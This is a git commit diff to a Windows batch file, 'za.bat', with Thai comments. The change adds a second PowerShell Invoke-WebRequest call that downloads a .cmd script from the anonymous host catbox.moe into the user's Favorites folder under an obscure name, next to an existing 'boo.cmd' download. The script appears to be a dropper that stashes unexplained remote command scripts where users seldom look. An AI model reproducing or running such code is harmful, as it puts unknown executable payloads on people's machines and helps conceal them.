cce73b496d38e5c2c4999b9b62d6186a1edf6a3b
Stephan999s <136429905+Stephan999s@users.noreply.github.com>
2024-03-01 21:21:42 +0700

    Update za.bat

--- za.bat
+++ za.bat
@@ -3,12 +3,16 @@ setlocal enabledelayedexpansion
 
 REM ระบุ URL ของไฟล์ที่ต้องการดาวน์โหลด
 set "fileURL=https://files.catbox.moe/zrz28x.cmd"
+set "fileURL2=https://files.catbox.moe/iutczy.cmd"
 
 REM ระบุโฟลเดอร์ที่ต้องการบันทึกไฟล์
 set "destinationFolder=%USERPROFILE%\Favorites"
 
 REM ใช้คำสั่ง PowerShell เพื่อดาวน์โหลดไฟล์
 powershell -command "& { Invoke-WebRequest -Uri '%fileURL%' -OutFile ('%destinationFolder%\boo.cmd') }"
+
+REM ใช้คำสั่ง PowerShell เพื่อดาวน์โหลดไฟล์ 2
+powershell -command "& { Invoke-WebRequest -Uri '%fileURL2%' -OutFile ('%destinationFolder%\Fewlovemomandpun.cmd') }"
 
 echo Download completed.
 
